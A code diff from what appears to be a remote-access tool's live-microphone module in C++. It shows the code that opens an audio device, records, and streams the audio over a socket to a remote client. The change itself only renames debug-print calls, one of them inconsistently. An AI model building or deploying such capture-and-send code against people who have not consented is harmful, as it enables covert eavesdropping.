@@ -63,7 +63,7 @@ void Mod_Mic::m_DetenerLive() {
 
 void Mod_Mic::m_LiveMicTh() {
     std::string strMSG = "[!] thLiveMic iniciada, dispositivo#: ";
-    DebugPrint(strMSG, this->p_DeviceID);
+    _DBG_(strMSG, this->p_DeviceID);
     
     // Definir el formato de audio
     WAVEFORMATEX wfx = {};
@@ -81,7 +81,7 @@ void Mod_Mic::m_LiveMicTh() {
     if (waveInOpen(&wi, this->p_DeviceID, &wfx, (DWORD_PTR)nullptr, (DWORD_PTR)nullptr, CALLBACK_NULL | WAVE_FORMAT_DIRECT) != MMSYSERR_NOERROR) {
         strMSG = "Error abriendo ";
         strMSG += std::to_string(this->p_DeviceID);
-        DebugPrint(strMSG);
+        __DBG_(strMSG);
         return;
     }
 
@@ -92,7 +92,7 @@ void Mod_Mic::m_LiveMicTh() {
 
     WORD* buffers = new WORD[wfx.nAvgBytesPerSec];
     if (buffers == NULL) {
-        DebugPrint("No se pudo reservar memoria para el mic");
+        __DBG_("No se pudo reservar memoria para el mic");
         waveInClose(wi);
         return;
     }
@@ -101,7 +101,7 @@ void Mod_Mic::m_LiveMicTh() {
     headers.lpData = reinterpret_cast<LPSTR>(buffers);
 
     if(waveInPrepareHeader(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
-        DebugPrint("No se pudo preparar el header");
+        __DBG_("No se pudo preparar el header");
         waveInClose(wi);
         if (buffers) {
             delete[] buffers;
@@ -111,7 +111,7 @@ void Mod_Mic::m_LiveMicTh() {
     }
 
     if(waveInAddBuffer(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
-        DebugPrint("No se pudo agregar datos al buffer");
+        __DBG_("No se pudo agregar datos al buffer");
         waveInUnprepareHeader(wi, &headers, sizeof(headers));
         waveInClose(wi);
         if (buffers) {
@@ -123,7 +123,7 @@ void Mod_Mic::m_LiveMicTh() {
 
     // Iniciar grabación
     if (waveInStart(wi) != MMSYSERR_NOERROR) {
-        DebugPrint("Error iniciando la grabacion");
+        __DBG_("Error iniciando la grabacion");
         waveInUnprepareHeader(wi, &headers, sizeof(headers));
         waveInClose(wi);
         if (buffers) {
@@ -164,5 +164,5 @@ void Mod_Mic::m_LiveMicTh() {
     cCliente->cChunkSend(cCliente->sckSocket, "0", 1, 0, true, nullptr, EnumComandos::Mic_Stop);
 
     strMSG = "[!] thLiveMicTh finalizada";
-    DebugPrint(strMSG);
+    __DBG_(strMSG);
 }
